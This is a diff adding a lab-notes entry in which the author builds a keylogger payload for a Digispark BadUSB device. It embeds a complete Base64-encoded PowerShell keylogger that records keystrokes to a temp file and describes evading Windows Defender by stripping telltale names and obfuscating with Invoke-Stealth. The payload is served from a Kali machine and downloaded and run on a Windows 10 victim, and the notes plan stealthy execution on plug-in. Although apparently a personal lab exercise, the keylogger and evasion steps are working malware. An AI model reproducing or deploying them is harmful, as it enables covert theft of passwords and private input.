@@ -722,3 +722,108 @@ After some test runs, all working like should.
 Most likely the final runs of the payloads, will be ran in specific fresh installation of Windows 10.*
 
 
+### 24.10.2023
+*Keylogger*
+
+Next up is the keylogger, which most likely is the most complicated one to implement.
+Things to consider:
+- Writing the script or downloading it.
+- Execution triggers Defender.
+- What to do with the logged keys.
+
+I started continuing to work with the Defender bypassing.
+
+The keylogger powershell script, ready made, and working IF REALTIME PROTECTION IS DISABLED
+
+Source:
+https://gist.githubusercontent.com/dasgoll/7ca1c059dd3b3fbc7277/raw/e4e3a530589dac67ab6c4c2428ea90de93b86018/gistfile1.txt
+
+Im doing these obsfuscations in my attacker machine (Kali Linux) and serving them via python webserver and using the victim (Windows 10) to download them and run.
+
+First i decided to go with the Base64 encoding:
+
+Base64 Encoded script:
+```bash
+I3JlcXVpcmVzIC1WZXJzaW9uIDIKZnVuY3Rpb24gU3RhcnQtS2V5TG9nZ2VyKCRQYXRoPSIkZW52
+OnRlbXBca2V5bG9nZ2VyLnR4dCIpIAp7CiAgIyBTaWduYXR1cmVzIGZvciBBUEkgQ2FsbHMKICAk
+c2lnbmF0dXJlcyA9IEAnCltEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0PUNoYXJTZXQu
+QXV0bywgRXhhY3RTcGVsbGluZz10cnVlKV0gCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIHNob3J0IEdl
+dEFzeW5jS2V5U3RhdGUoaW50IHZpcnR1YWxLZXlDb2RlKTsgCltEbGxJbXBvcnQoInVzZXIzMi5k
+bGwiLCBDaGFyU2V0PUNoYXJTZXQuQXV0byldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBHZXRL
+ZXlib2FyZFN0YXRlKGJ5dGVbXSBrZXlzdGF0ZSk7CltEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBD
+aGFyU2V0PUNoYXJTZXQuQXV0byldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBNYXBWaXJ0dWFs
+S2V5KHVpbnQgdUNvZGUsIGludCB1TWFwVHlwZSk7CltEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBD
+aGFyU2V0PUNoYXJTZXQuQXV0byldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBUb1VuaWNvZGUo
+dWludCB3VmlydEtleSwgdWludCB3U2NhbkNvZGUsIGJ5dGVbXSBscGtleXN0YXRlLCBTeXN0ZW0u
+VGV4dC5TdHJpbmdCdWlsZGVyIHB3c3pCdWZmLCBpbnQgY2NoQnVmZiwgdWludCB3RmxhZ3MpOwon
+QAoKICAjIGxvYWQgc2lnbmF0dXJlcyBhbmQgbWFrZSBtZW1iZXJzIGF2YWlsYWJsZQogICRBUEkg
+PSBBZGQtVHlwZSAtTWVtYmVyRGVmaW5pdGlvbiAkc2lnbmF0dXJlcyAtTmFtZSAnV2luMzInIC1O
+YW1lc3BhY2UgQVBJIC1QYXNzVGhydQogICAgCiAgIyBjcmVhdGUgb3V0cHV0IGZpbGUKICAkbnVs
+bCA9IE5ldy1JdGVtIC1QYXRoICRQYXRoIC1JdGVtVHlwZSBGaWxlIC1Gb3JjZQoKICB0cnkKICB7
+CiAgICBXcml0ZS1Ib3N0ICdSZWNvcmRpbmcga2V5IHByZXNzZXMuIFByZXNzIENUUkwrQyB0byBz
+ZWUgcmVzdWx0cy4nIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkCgogICAgIyBjcmVhdGUgZW5kbGVzcyBs
+b29wLiBXaGVuIHVzZXIgcHJlc3NlcyBDVFJMK0MsIGZpbmFsbHktYmxvY2sKICAgICMgZXhlY3V0
+ZXMgYW5kIHNob3dzIHRoZSBjb2xsZWN0ZWQga2V5IHByZXNzZXMKICAgIHdoaWxlICgkdHJ1ZSkg
+ewogICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDQwCiAgICAgIAogICAgICAjIHNjYW4g
+YWxsIEFTQ0lJIGNvZGVzIGFib3ZlIDgKICAgICAgZm9yICgkYXNjaWkgPSA5OyAkYXNjaWkgLWxl
+IDI1NDsgJGFzY2lpKyspIHsKICAgICAgICAjIGdldCBjdXJyZW50IGtleSBzdGF0ZQogICAgICAg
+ICRzdGF0ZSA9ICRBUEk6OkdldEFzeW5jS2V5U3RhdGUoJGFzY2lpKQoKICAgICAgICAjIGlzIGtl
+eSBwcmVzc2VkPwogICAgICAgIGlmICgkc3RhdGUgLWVxIC0zMjc2NykgewogICAgICAgICAgJG51
+bGwgPSBbY29uc29sZV06OkNhcHNMb2NrCgogICAgICAgICAgIyB0cmFuc2xhdGUgc2NhbiBjb2Rl
+IHRvIHJlYWwgY29kZQogICAgICAgICAgJHZpcnR1YWxLZXkgPSAkQVBJOjpNYXBWaXJ0dWFsS2V5
+KCRhc2NpaSwgMykKCiAgICAgICAgICAjIGdldCBrZXlib2FyZCBzdGF0ZSBmb3IgdmlydHVhbCBr
+ZXlzCiAgICAgICAgICAka2JzdGF0ZSA9IE5ldy1PYmplY3QgQnl0ZVtdIDI1NgogICAgICAgICAg
+JGNoZWNra2JzdGF0ZSA9ICRBUEk6OkdldEtleWJvYXJkU3RhdGUoJGtic3RhdGUpCgogICAgICAg
+ICAgIyBwcmVwYXJlIGEgU3RyaW5nQnVpbGRlciB0byByZWNlaXZlIGlucHV0IGtleQogICAgICAg
+ICAgJG15Y2hhciA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LlN0cmluZ0J1aWxk
+ZXIKCiAgICAgICAgICAjIHRyYW5zbGF0ZSB2aXJ0dWFsIGtleQogICAgICAgICAgJHN1Y2Nlc3Mg
+PSAkQVBJOjpUb1VuaWNvZGUoJGFzY2lpLCAkdmlydHVhbEtleSwgJGtic3RhdGUsICRteWNoYXIs
+ICRteWNoYXIuQ2FwYWNpdHksIDApCgogICAgICAgICAgaWYgKCRzdWNjZXNzKSAKICAgICAgICAg
+IHsKICAgICAgICAgICAgIyBhZGQga2V5IHRvIGxvZ2dlciBmaWxlCiAgICAgICAgICAgIFtTeXN0
+ZW0uSU8uRmlsZV06OkFwcGVuZEFsbFRleHQoJFBhdGgsICRteWNoYXIsIFtTeXN0ZW0uVGV4dC5F
+bmNvZGluZ106OlVuaWNvZGUpIAogICAgICAgICAgfQogICAgICAgIH0KICAgICAgfQogICAgfQog
+IH0KICBmaW5hbGx5CiAgewogICAgIyBvcGVuIGxvZ2dlciBmaWxlIGluIE5vdGVwYWQKICAgIG5v
+dGVwYWQgJFBhdGgKICB9Cn0KCiMgcmVjb3JkcyBhbGwga2V5IHByZXNzZXMgdW50aWwgc2NyaXB0
+IGlzIGFib3J0ZWQgYnkgcHJlc3NpbmcgQ1RSTCtDCiMgd2lsbCB0aGVuIG9wZW4gdGhlIGZpbGUg
+d2l0aCBjb2xsZWN0ZWQga2V5IGNvZGVzClN0YXJ0LUtleUxvZ2dlcgo=
+```
+
+Didnt work, got blocked.
+
+![](notes_res/notes-%208.png)
+
+What came to my mind, while reading here and there everywhere, that i first remove all the unneccessary comments and mentions of "key logging" from the script, and came up with this:   
+[helper.ps1](notes_res/helper.ps1)
+
+Also changed the function to "Start-Helper" instead of Key logger.
+
+Also while studying the obsfuscations, i bumped in to this:   
+https://github.com/JoelGMSec/Invoke-Stealth    
+And the guide/help:   
+https://darkbyte.net/ofuscando-scripts-de-powershell-con-invoke-stealth/
+
+I made a little testing lab thing to my Kali:
+![](notes-%209.png)
+
+So:   
+1. I used the Invoke-Stealth in powershell to obsfuscate the `maltsu.ps1` with ReverseB64
+2. `maltsu.ps1` obscuscated, so that it uses a variable, which is the encoded script and then it decodes that on the fly.
+3. Webserver, serving the payload (`maltsu.ps1`)
+
+Full obsfuscated payload:
+[maltsu.ps1](notes_res/maltsu.ps1)
+
+Execution from Victim:   
+![](notes_res/notes-%2010.png)
+
+**And Profit!**
+
+![](notes-%2011.png)
+
+1. Download the payload from attacker and execute it.
+2. Go to a browser and type something.
+3. In a Temp directory, a file named `help` is created
+4. File contains the logged keys!
+
+
+**Next up, is running everyhing when Digispark is plugged, as Stealth as possible!**
